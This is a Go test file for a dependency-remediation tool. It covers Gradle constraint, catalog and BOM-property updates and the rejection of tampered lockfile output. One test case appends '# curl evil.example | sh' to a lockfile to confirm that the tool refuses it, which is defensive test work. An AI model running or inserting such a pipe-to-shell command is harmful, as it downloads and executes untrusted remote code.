package remediation

import (
	"strings"
	"testing"

	"github.com/kitsunetrail/kestrelynx/internal/scanner"
	"github.com/kitsunetrail/kestrelynx/internal/worker"
)

// groovyFiles is a Groovy project without the Spring Boot plugins that
// declares commons-text; commons-lang3 comes with it.
func groovyFiles() map[string]string {
	return map[string]string{
		"gradle.lockfile": gradleLockBase,
		"build.gradle": `plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.apache.commons:commons-text:1.9'
}

dependencyLocking {
    lockAllConfigurations()
    lockMode = LockMode.STRICT
}
`,
		"settings.gradle":                          "rootProject.name = 'demo'\n",
		"gradle/wrapper/gradle-wrapper.properties": wrapper982,
	}
}

func TestGradleUpdateConstraintInBothSyntaxes(t *testing.T) {
	t.Run("groovy", func(t *testing.T) {
		f := newGradleFlow(t, groovyFiles())
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		build := artifactsByPath(it)["svc/build.gradle"]
		want := "\ndependencies {\n    constraints {\n        implementation 'org.apache.commons:commons-lang3:3.18.0'\n    }\n}\n"
		if !strings.HasSuffix(build, "}\n"+want) || !strings.Contains(build, "commons-text:1.10.0'") {
			t.Errorf("build.gradle:\n%s", build)
		}
		if _, ok := artifactsByPath(it)["svc/gradle.properties"]; ok {
			t.Error("a property file was made without a BOM")
		}
		var kinds []string
		for _, e := range it.Update.Gradle.Edits {
			kinds = append(kinds, e.Kind)
		}
		if strings.Join(kinds, ",") != GradleEditConstraint+","+GradleEditDeclaration && strings.Join(kinds, ",") != GradleEditDeclaration+","+GradleEditConstraint {
			t.Errorf("edits = %v", kinds)
		}
	})
	t.Run("kotlin, no dependency management", func(t *testing.T) {
		files := gradleFiles()
		files["build.gradle.kts"] = strings.Replace(files["build.gradle.kts"], "\tid(\"io.spring.dependency-management\") version \"1.1.7\"\n", "", 1)
		f := newGradleFlow(t, files)
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		build := artifactsByPath(it)["svc/build.gradle.kts"]
		if !strings.HasSuffix(build, "\ndependencies {\n\tconstraints {\n\t\timplementation(\"org.apache.commons:commons-lang3:3.18.0\")\n\t}\n}\n") {
			t.Errorf("build.gradle.kts:\n%s", build)
		}
	})
	t.Run("a package outside the configurations implementation reaches", func(t *testing.T) {
		files := groovyFiles()
		files["gradle.lockfile"] = strings.Replace(gradleLockBase, "org.apache.commons:commons-lang3:3.11=compileClasspath,productionRuntimeClasspath,runtimeClasspath",
			"org.apache.commons:commons-lang3:3.11=compileClasspath,productionRuntimeClasspath,runtimeClasspath,developmentClasspath", 1)
		f := newGradleFlow(t, files)
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		p := pkgsByName(it)["org.apache.commons:commons-lang3"]
		if p.Reason != ReasonGradleVersionSourceUnsupported || !p.LeftOut || !strings.Contains(p.Detail, "developmentClasspath") {
			t.Errorf("commons-lang3 = %+v", p)
		}
	})
}

const catalogFiles = `[versions]
text = "1.9"

[libraries]
commons-text = { module = "org.apache.commons:commons-text", version.ref = "text" }
`

func catalogProject(catalog, deps string) map[string]string {
	f := gradleFiles()
	f["build.gradle.kts"] = strings.Replace(f["build.gradle.kts"], `	implementation("org.apache.commons:commons-text:1.9")`, deps, 1)
	f["gradle/libs.versions.toml"] = catalog
	return f
}

func TestGradleUpdateCatalog(t *testing.T) {
	t.Run("a version shared through version.ref", func(t *testing.T) {
		f := newGradleFlow(t, catalogProject(catalogFiles, "\timplementation(libs.commons.text)"))
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		art := artifactsByPath(it)
		if got := art["svc/gradle/libs.versions.toml"]; got != strings.Replace(catalogFiles, `text = "1.9"`, `text = "1.10.0"`, 1) {
			t.Errorf("catalog:\n%s", got)
		}
		if strings.Contains(art["svc/build.gradle.kts"], "1.10.0") {
			t.Error("the build script was edited too")
		}
		if e := it.Update.Gradle.Edits[0]; e.Kind != GradleEditCatalogVersion && it.Update.Gradle.Edits[1].Kind != GradleEditCatalogVersion {
			t.Errorf("edits = %+v", it.Update.Gradle.Edits)
		}
	})
	t.Run("a library that writes its version", func(t *testing.T) {
		cat := "[libraries]\ncommons-text = { module = \"org.apache.commons:commons-text\", version = \"1.9\" } # text\n"
		f := newGradleFlow(t, catalogProject(cat, "\timplementation(libs.commons.text)"))
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		if got := artifactsByPath(it)["svc/gradle/libs.versions.toml"]; got != strings.Replace(cat, `"1.9"`, `"1.10.0"`, 1) {
			t.Errorf("catalog:\n%s", got)
		}
	})
	t.Run("a library in the string form", func(t *testing.T) {
		cat := "[libraries]\ncommons-text = \"org.apache.commons:commons-text:1.9\"\n"
		f := newGradleFlow(t, catalogProject(cat, "\timplementation(libs.commons.text)"))
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		if got := artifactsByPath(it)["svc/gradle/libs.versions.toml"]; got != strings.Replace(cat, ":1.9", ":1.10.0", 1) {
			t.Errorf("catalog:\n%s", got)
		}
	})
	t.Run("a version a plugin shares", func(t *testing.T) {
		cat := catalogFiles + "\n[plugins]\nother = { id = \"com.example.other\", version.ref = \"text\" }\n"
		f := newGradleFlow(t, catalogProject(cat, "\timplementation(libs.commons.text)"))
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		p := pkgsByName(it)["org.apache.commons:commons-text"]
		if p.Reason != ReasonGradleVersionSourceUnsupported || !p.LeftOut || !strings.Contains(p.Detail, "plugin") {
			t.Errorf("commons-text = %+v", p)
		}
	})
	t.Run("the shared version also sets a library that has no such release", func(t *testing.T) {
		cat := strings.Replace(catalogFiles, "[libraries]\n", "[libraries]\nother = { module = \"org.example:other\", version.ref = \"text\" }\n", 1)
		f := newGradleFlow(t, catalogProject(cat, "\timplementation(libs.commons.text)"))
		f.reg.versions["org.example:other"] = []string{"1.9"}
		it := f.run()
		wantCategory(t, it, CategoryManual, ReasonMavenReleaseNotFound)
		if !strings.Contains(it.Detail, "org.example:other") || len(f.work.jobs) != 0 {
			t.Errorf("detail %q, jobs %d", it.Detail, len(f.work.jobs))
		}
	})
}

func TestGradleUpdateDeclarationSources(t *testing.T) {
	t.Run("the string appears twice", func(t *testing.T) {
		files := gradleFiles()
		files["build.gradle.kts"] = strings.Replace(files["build.gradle.kts"], `	implementation("org.apache.commons:commons-text:1.9")`,
			"\timplementation(\"org.apache.commons:commons-text:1.9\")\n\ttestImplementation(\"org.apache.commons:commons-text:1.9\")", 1)
		f := newGradleFlow(t, files)
		it := f.run()
		// The lock target of commons-text is left out; commons-lang3 is
		// still updated, as the item is proposed without it.
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		got := pkgsByName(it)
		if p := got["org.apache.commons:commons-text"]; p.Action != ActionManual || p.Reason != ReasonGradleVersionSourceUnsupported || !p.LeftOut {
			t.Errorf("commons-text = %+v", p)
		}
		if got["org.apache.commons:commons-lang3"].AdoptedVersion != "3.18.0" {
			t.Errorf("commons-lang3 = %+v", got["org.apache.commons:commons-lang3"])
		}
	})
	t.Run("declared lower than it resolves", func(t *testing.T) {
		files := gradleFiles()
		files["gradle.lockfile"] = strings.Replace(gradleLockBase, "commons-text:1.9=", "commons-text:1.9=", 1)
		files["build.gradle.kts"] = strings.Replace(files["build.gradle.kts"], "commons-text:1.9", "commons-text:1.8", 1)
		f := newGradleFlow(t, files)
		it := f.run()
		got := pkgsByName(it)["org.apache.commons:commons-text"]
		if got.Reason != ReasonGradleVersionSourceUnsupported || !strings.Contains(got.Detail, "declared at 1.8") {
			t.Errorf("commons-text = %+v (item %s %s)", got, it.Category, it.Reason)
		}
	})
	t.Run("declared without a version where no BOM manages it", func(t *testing.T) {
		files := gradleFiles()
		files["build.gradle.kts"] = strings.Replace(files["build.gradle.kts"], "commons-text:1.9", "commons-text", 1)
		f := newGradleFlow(t, files)
		it := f.run()
		got := pkgsByName(it)["org.apache.commons:commons-text"]
		if got.Reason != ReasonGradleVersionSourceUnsupported || !strings.Contains(got.Detail, "without a version") {
			t.Errorf("commons-text = %+v (item %s %s)", got, it.Category, it.Reason)
		}
	})
}

// bomProject is a project whose commons-lang3 version the Spring Boot BOM
// decides, with the property set where the test says.
func bomProject(props, script string) map[string]string {
	files := gradleFiles()
	files["build.gradle.kts"] = strings.Replace(files["build.gradle.kts"], "\timplementation(\"org.apache.commons:commons-text:1.9\")\n", "", 1) + script
	files["gradle.lockfile"] = strings.Replace(gradleLockBase, "commons-text:1.9=", "commons-text:1.10.0=", 1)
	if props != "" {
		files["gradle.properties"] = props
	}
	return files
}

func langOnly() scanner.Finding {
	return jarFinding("CVE-LANG", bootLib+"commons-lang3-3.11.jar", "org.apache.commons:commons-lang3", "3.11", "3.18.0")
}

func TestGradleUpdateBOMProperty(t *testing.T) {
	t.Run("added to a gradle.properties that exists", func(t *testing.T) {
		f := newGradleFlow(t, bomProject("org.gradle.parallel=true\n", ""), langOnly())
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		if got := artifactsByPath(it)["svc/gradle.properties"]; got != "org.gradle.parallel=true\ncommons-lang3.version=3.18.0\n" {
			t.Errorf("gradle.properties = %q", got)
		}
		if f.work.srcs[0]["gradle.properties"] == nil {
			t.Error("the job lacks gradle.properties")
		}
	})
	t.Run("appended after a last line with no line break", func(t *testing.T) {
		f := newGradleFlow(t, bomProject("org.gradle.parallel=true", ""), langOnly())
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		if got := artifactsByPath(it)["svc/gradle.properties"]; got != "org.gradle.parallel=true\ncommons-lang3.version=3.18.0\n" {
			t.Errorf("gradle.properties = %q", got)
		}
	})
	t.Run("rewritten where gradle.properties sets it", func(t *testing.T) {
		f := newGradleFlow(t, bomProject("# pins\r\ncommons-lang3.version = 3.11\r\norg.gradle.parallel=true\r\n", ""), langOnly())
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		if got := artifactsByPath(it)["svc/gradle.properties"]; got != "# pins\r\ncommons-lang3.version = 3.18.0\r\norg.gradle.parallel=true\r\n" {
			t.Errorf("gradle.properties = %q", got)
		}
		if e := it.Update.Gradle.Edits[0]; e.Kind != GradleEditProperty || e.From != "3.11" || e.To != "3.18.0" {
			t.Errorf("edit = %+v", e)
		}
	})
	t.Run("rewritten where the build script sets it", func(t *testing.T) {
		f := newGradleFlow(t, bomProject("", "\nextra[\"commons-lang3.version\"] = \"3.11\" // pin\n"), langOnly())
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		art := artifactsByPath(it)
		if !strings.HasSuffix(art["svc/build.gradle.kts"], "extra[\"commons-lang3.version\"] = \"3.18.0\" // pin\n") {
			t.Errorf("build.gradle.kts:\n%s", art["svc/build.gradle.kts"])
		}
		if _, ok := art["svc/gradle.properties"]; ok {
			t.Error("gradle.properties was made")
		}
	})
	t.Run("set in both places", func(t *testing.T) {
		f := newGradleFlow(t, bomProject("commons-lang3.version=3.11\n", "\nextra[\"commons-lang3.version\"] = \"3.11\"\n"), langOnly())
		it := f.run()
		wantCategory(t, it, CategoryManual, ReasonGradleVersionSourceUnsupported)
		if !strings.Contains(it.Detail, "more than once") || len(f.work.jobs) != 0 {
			t.Errorf("detail %q, jobs %d", it.Detail, len(f.work.jobs))
		}
	})
	t.Run("a property the BOM does not define", func(t *testing.T) {
		f := newGradleFlow(t, bomProject("mine.version=1.0\n", ""), langOnly())
		it := f.run()
		wantCategory(t, it, CategoryManual, ReasonGradleBuildUnsupported)
		if !strings.Contains(it.Detail, "mine.version") || len(f.work.jobs) != 0 {
			t.Errorf("detail %q, jobs %d", it.Detail, len(f.work.jobs))
		}
	})
	t.Run("the other packages of the property are not at the new value", func(t *testing.T) {
		files := bomProject("", "")
		files["gradle.lockfile"] = strings.Replace(files["gradle.lockfile"], "org.junit.jupiter", "org.yaml:snakeyaml:2.6=compileClasspath,productionRuntimeClasspath,runtimeClasspath\norg.junit.jupiter", 1)
		f := newGradleFlow(t, files, jarFinding("CVE-YAML", bootLib+"snakeyaml-2.6.jar", "org.yaml:snakeyaml", "2.6", "2.7"))
		f.reg.versions["org.yaml:snakeyaml-engine"] = []string{"2.6"}
		it := f.run()
		wantCategory(t, it, CategoryManual, ReasonMavenReleaseNotFound)
		if !strings.Contains(it.Detail, "snakeyaml-engine") {
			t.Errorf("detail = %q", it.Detail)
		}
	})
	t.Run("the packages that move with the property are listed", func(t *testing.T) {
		files := bomProject("", "")
		files["gradle.lockfile"] = strings.Replace(files["gradle.lockfile"], "org.junit.jupiter", "org.yaml:snakeyaml:2.6=compileClasspath,productionRuntimeClasspath,runtimeClasspath\norg.yaml:snakeyaml-engine:2.6=compileClasspath,productionRuntimeClasspath,runtimeClasspath\norg.junit.jupiter", 1)
		f := newGradleFlow(t, files, jarFinding("CVE-YAML", bootLib+"snakeyaml-2.6.jar", "org.yaml:snakeyaml", "2.6", "2.7"))
		f.vulns = map[string][]string{"org.yaml:snakeyaml@2.6": {"CVE-YAML"}}
		f.lock = func(src map[string][]byte) string {
			lock := string(src["gradle.lockfile"])
			if strings.Contains(string(src["gradle.properties"]), "snakeyaml.version=2.7") {
				lock = strings.ReplaceAll(strings.ReplaceAll(lock, "snakeyaml:2.6=", "snakeyaml:2.7="), "snakeyaml-engine:2.6=", "snakeyaml-engine:2.7=")
			}
			return lock
		}
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		c := it.Update.Gradle.Companions
		if len(c) != 1 || c[0].Key != "snakeyaml.version" || c[0].Value != "2.7" || strings.Join(c[0].Packages, ",") != "org.yaml:snakeyaml-engine" {
			t.Errorf("companions = %+v", c)
		}
		if len(it.Update.Gradle.Moves) != 1 || it.Update.Gradle.Moves[0].Name != "org.yaml:snakeyaml-engine" {
			t.Errorf("moves = %+v", it.Update.Gradle.Moves)
		}
	})
}

func jacksonProject() map[string]string {
	files := bomProject("", "")
	files["gradle.lockfile"] = strings.Replace(files["gradle.lockfile"], "org.junit.jupiter",
		"com.fasterxml.jackson.core:jackson-databind:2.13.3=compileClasspath,productionRuntimeClasspath,runtimeClasspath\norg.junit.jupiter", 1)
	return files
}

func jacksonFinding() scanner.Finding {
	return jarFinding("CVE-J", bootLib+"jackson-databind-2.13.3.jar", "com.fasterxml.jackson.core:jackson-databind", "2.13.3", "2.12.7.1, 2.13.4.2")
}

func TestGradleUpdateNestedBOM(t *testing.T) {
	jacksonLock := func(src map[string][]byte) string {
		lock := string(src["gradle.lockfile"])
		if strings.Contains(string(src["gradle.properties"]), "jackson-bom.version=2.13.4.20221013") {
			lock = strings.Replace(lock, "jackson-databind:2.13.3=", "jackson-databind:2.13.4.2=", 1)
		}
		return lock
	}
	t.Run("the lowest release of the same minor that reaches the target", func(t *testing.T) {
		f := newGradleFlow(t, jacksonProject(), jacksonFinding())
		f.vulns = map[string][]string{"com.fasterxml.jackson.core:jackson-databind@2.13.3": {"CVE-J"}}
		f.reg.versions["com.fasterxml.jackson.core:jackson-databind"] = []string{"2.13.3", "2.13.4", "2.13.4.2"}
		f.lock = jacksonLock
		it := f.run()
		wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
		if got := artifactsByPath(it)["svc/gradle.properties"]; got != "jackson-bom.version=2.13.4.20221013\n" {
			t.Errorf("gradle.properties = %q", got)
		}
		if e := it.Update.Gradle.Edits[0]; e.Kind != GradleEditPropertyOverride || e.From != "2.13.3" || e.To != "2.13.4.20221013" {
			t.Errorf("edit = %+v", e)
		}
		if p := pkgsByName(it)["com.fasterxml.jackson.core:jackson-databind"]; p.AdoptedVersion != "2.13.4.2" {
			t.Errorf("adopted = %q", p.AdoptedVersion)
		}
	})
	t.Run("no release of the minor reaches it", func(t *testing.T) {
		f := newGradleFlow(t, jacksonProject(), jacksonFinding())
		f.reg.versions["com.fasterxml.jackson.core:jackson-databind"] = []string{"2.13.3", "2.13.4", "2.13.4.2", "2.14.0"}
		delete(f.reg.poms, "com.fasterxml.jackson:jackson-bom:2.13.4.20221013")
		f.reg.versions["com.fasterxml.jackson:jackson-bom"] = []string{"2.13.3", "2.13.4", "2.14.0"}
		f.reg.poms["com.fasterxml.jackson:jackson-bom:2.14.0"] = jacksonBOM("2.14.0", "2.14.0")
		it := f.run()
		wantCategory(t, it, CategoryManual, ReasonMavenBOMSeriesUnreached)
		p := pkgsByName(it)["com.fasterxml.jackson.core:jackson-databind"]
		if b := p.BOMRaise(); b == nil || b.BOM != "com.fasterxml.jackson:jackson-bom" || b.Property != "" && b.Property != "jackson-bom.version" || b.To != "2.14.0" || b.Manages != "2.14.0" {
			t.Errorf("bom raise = %+v", b)
		}
		if len(f.work.jobs) != 0 {
			t.Error("a job ran for a package that was left out")
		}
	})
	t.Run("a package the BOM writes a literal version for", func(t *testing.T) {
		files := bomProject("", "")
		files["gradle.lockfile"] = strings.Replace(files["gradle.lockfile"], "org.junit.jupiter", "org.example:literal:1.0=compileClasspath,productionRuntimeClasspath,runtimeClasspath\norg.junit.jupiter", 1)
		f := newGradleFlow(t, files, jarFinding("CVE-LIT", bootLib+"literal-1.0.jar", "org.example:literal", "1.0", "1.1"))
		f.reg.versions["org.example:literal"] = []string{"1.0", "1.1"}
		it := f.run()
		wantCategory(t, it, CategoryManual, ReasonGradleVersionSourceUnsupported)
	})
}

func TestGradleUpdateRuntime(t *testing.T) {
	t.Run("no image for the version", func(t *testing.T) {
		files := groovyFiles()
		files["gradle/wrapper/gradle-wrapper.properties"] = strings.Replace(wrapper982, "9.8.2", "8.14.5", 1)
		f := newGradleFlow(t, files)
		it := f.run()
		wantCategory(t, it, CategoryManual, ReasonGradleVersionUnsupported)
		if len(f.work.jobs) != 0 {
			t.Error("a job ran")
		}
	})
	t.Run("no image for the toolchain", func(t *testing.T) {
		files := groovyFiles()
		files["build.gradle"] = strings.Replace(files["build.gradle"], "repositories {", "java {\n    toolchain {\n        languageVersion = JavaLanguageVersion.of(25)\n    }\n}\n\nrepositories {", 1)
		f := newGradleFlow(t, files)
		it := f.run()
		wantCategory(t, it, CategoryManual, ReasonGradleToolchainUnsupported)
	})
	t.Run("an image on another platform is not used", func(t *testing.T) {
		f := newGradleFlow(t, groovyFiles())
		f.cfg.Platform = "linux/arm64"
		wantCategory(t, f.run(), CategoryManual, ReasonGradleVersionUnsupported)
	})
}

func TestGradleUpdateRefusesTheWorkContainersOutput(t *testing.T) {
	base := func(t *testing.T) *gradleFlow { return newGradleFlow(t, gradleFiles()) }
	lockWith := func(mutate func(lock string) string) func(src map[string][]byte) string {
		return func(src map[string][]byte) string {
			lock := base(t).defaultLock(src)
			// The update itself: commons-text and commons-lang3 at their targets.
			lock = strings.Replace(lock, "commons-lang3:3.12.0=", "commons-lang3:3.18.0=", 1)
			return mutate(lock)
		}
	}
	cases := []struct {
		name   string
		mutate func(lock string) string
		files  func(map[string]string)
		cat    Category
		reason Reason
		inside string
	}{
		{"an entry taken out", func(l string) string {
			return strings.Replace(l, "org.springframework.boot:spring-boot-starter-webmvc:4.1.2=compileClasspath,productionRuntimeClasspath,runtimeClasspath\n", "", 1)
		}, nil, CategoryManual, ReasonGradleLockEntryRemoved, "spring-boot-starter-webmvc"},
		{"a target taken out of one configuration", func(l string) string {
			return strings.Replace(l, "commons-lang3:3.18.0=compileClasspath,productionRuntimeClasspath,runtimeClasspath", "commons-lang3:3.18.0=compileClasspath,runtimeClasspath", 1)
		}, nil, CategoryManual, ReasonGradleLockEntryRemoved, "commons-lang3"},
		{"a configuration that vanished", func(l string) string {
			return strings.Replace(l, "org.junit.jupiter:junit-jupiter:5.10.0=testCompileClasspath,testRuntimeClasspath\n", "", 1)
		}, nil, CategoryManual, ReasonGradleLockConfigurationsChanged, "testRuntimeClasspath"},
		{"a configuration that appeared", func(l string) string {
			return strings.Replace(l, "5.10.0=testCompileClasspath,testRuntimeClasspath", "5.10.0=testCompileClasspath,testRuntimeClasspath,extraClasspath", 1)
		}, nil, CategoryManual, ReasonGradleLockConfigurationsChanged, "extraClasspath"},
		{"the empty line changed", func(l string) string {
			return strings.Replace(l, "empty=annotationProcessor,testAnnotationProcessor", "empty=annotationProcessor", 1)
		}, nil, CategoryManual, ReasonGradleLockConfigurationsChanged, "empty"},
		{"a target left below its release in a configuration", func(l string) string {
			return strings.Replace(l, "commons-lang3:3.18.0=compileClasspath,productionRuntimeClasspath,runtimeClasspath", "commons-lang3:3.18.0=compileClasspath,productionRuntimeClasspath\norg.apache.commons:commons-lang3:3.12.0=runtimeClasspath", 1)
		}, nil, CategoryManual, ReasonTargetNotUpdated, "below 3.18.0"},
		{"a snapshot", func(l string) string {
			return strings.Replace(l, "org.junit.jupiter", "org.example:snap:1.0-SNAPSHOT=compileClasspath\norg.junit.jupiter", 1)
		}, nil, CategoryManual, ReasonGradleLockVersionUnsupported, "1.0-SNAPSHOT"},
		{"a coordinate Maven Central has no pom for", func(l string) string {
			return strings.Replace(l, "org.junit.jupiter", "org.example:ghost:1.0=compileClasspath\norg.junit.jupiter", 1)
		}, nil, CategoryManual, ReasonDistributionMismatch, "ghost"},
		{"the same entry twice", func(l string) string {
			return strings.Replace(l, "org.junit.jupiter", "org.apache.commons:commons-text:1.10.0=compileClasspath,productionRuntimeClasspath,runtimeClasspath\norg.junit.jupiter", 1)
		}, nil, CategoryManual, ReasonOutputFilesInvalid, "twice"},
		{"two versions in one configuration", func(l string) string {
			return strings.Replace(l, "org.junit.jupiter", "org.apache.commons:commons-text:1.11.0=compileClasspath\norg.junit.jupiter", 1)
		}, nil, CategoryManual, ReasonOutputFilesInvalid, "contradicts itself"},
		{"a line of a form Gradle does not write", func(l string) string { return l + "what is this\n" },
			nil, CategoryManual, ReasonOutputFilesInvalid, "cannot be read"},
		{"a comment Gradle does not write", func(l string) string { return l + "# curl evil.example | sh\n" },
			nil, CategoryManual, ReasonOutputFilesInvalid, "comment"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := newGradleFlow(t, gradleFiles())
			f.lock = lockWith(c.mutate)
			it := f.run()
			wantCategory(t, it, c.cat, c.reason)
			if !strings.Contains(it.Detail, c.inside) {
				t.Errorf("detail = %q, want it to mention %q", it.Detail, c.inside)
			}
			if it.Artifacts != nil {
				t.Error("the item keeps files of a refused update")
			}
		})
	}
}

func TestGradleUpdateRefusesChangedInputs(t *testing.T) {
	for _, name := range []string{"build.gradle.kts", "settings.gradle.kts", "gradle/wrapper/gradle-wrapper.properties", "settings-gradle.lockfile"} {
		t.Run(name, func(t *testing.T) {
			files := gradleFiles()
			files["settings-gradle.lockfile"] = "empty=incomingCatalogForSettings\n"
			f := newGradleFlow(t, files)
			f.outcome = func(o *fakeOutcome, lock string) {
				o.edit[stepUpdate][name] = []byte("changed\n")
			}
			it := f.run()
			wantCategory(t, it, CategoryManual, ReasonOutputFilesInvalid)
			if !strings.Contains(it.Detail, name) {
				t.Errorf("detail = %q", it.Detail)
			}
		})
	}
	t.Run("a file the final tree lacks", func(t *testing.T) {
		f := newGradleFlow(t, gradleFiles())
		f.outcome = func(o *fakeOutcome, lock string) {
			o.mangle = func(files map[string][]byte) { delete(files, worker.FinalDir+"/build.gradle.kts") }
		}
		it := f.run()
		wantCategory(t, it, CategoryFailed, ReasonUpdateResultInvalid)
	})
	t.Run("a file the step did not declare", func(t *testing.T) {
		f := newGradleFlow(t, gradleFiles())
		f.outcome = func(o *fakeOutcome, lock string) {
			o.mangle = func(files map[string][]byte) { files[worker.FinalDir+"/gradle.properties"] = []byte("x=y\n") }
		}
		wantCategory(t, f.run(), CategoryFailed, ReasonUpdateResultInvalid)
	})
}

func TestGradleUpdateListsWhatElseMoved(t *testing.T) {
	f := newGradleFlow(t, gradleFiles())
	f.reg.versions["org.example:newdep"] = []string{"1.0"}
	f.lock = func(src map[string][]byte) string {
		lock := strings.Replace(newGradleFlow(t, gradleFiles()).defaultLock(src), "commons-lang3:3.12.0=", "commons-lang3:3.18.0=", 1)
		return strings.Replace(lock, "org.junit.jupiter", "org.example:newdep:1.0=compileClasspath,productionRuntimeClasspath,runtimeClasspath\norg.junit.jupiter", 1)
	}
	f.vulns = map[string][]string{"org.apache.commons:commons-text@1.9": {"CVE-TEXT"}, "org.apache.commons:commons-lang3@3.11": {"CVE-LANG"}}
	it := f.run()
	wantCategory(t, it, CategoryPRCandidate, ReasonUpdateVerified)
	m := it.Update.Gradle.Moves
	if len(m) != 1 || m[0].Name != "org.example:newdep" || len(m[0].From) != 0 || len(m[0].To) != 1 || m[0].To[0] != "1.0" {
		t.Errorf("moves = %+v", m)
	}
}

func TestGradleUpdateSourceCheckFindsNewFindings(t *testing.T) {
	f := newGradleFlow(t, gradleFiles())
	f.vulns["org.apache.commons:commons-text@1.10.0"] = []string{"CVE-NEW"}
	it := f.run()
	wantCategory(t, it, CategoryManual, ReasonSourceIntroduced)
}

func TestGradleUpdateInputsChangedSincePlan(t *testing.T) {
	f := newGradleFlow(t, gradleFiles())
	f.item.Source.Files[0].BlobSHA = strings.Repeat("a", 40)
	wantCategory(t, f.run(), CategoryFailed, ReasonSourceChanged)
	g := newGradleFlow(t, gradleFiles())
	for p, c := range map[string]string{"svc/gradle.properties": "org.gradle.parallel=true\n"} {
		g.cfg.GitHub.(*fakeGH).files[p] = []byte(c)
	}
	g.item.Source.Absent = append(g.item.Source.Absent, "svc/gradle.properties")
	wantCategory(t, g.run(), CategoryFailed, ReasonSourceChanged)
}

func TestGradleUpdateNeedsMavenCentral(t *testing.T) {
	f := newGradleFlow(t, gradleFiles())
	f.cfg.Maven = nil
	wantCategory(t, f.run(), CategoryFailed, ReasonUpdateInputInvalid)
}
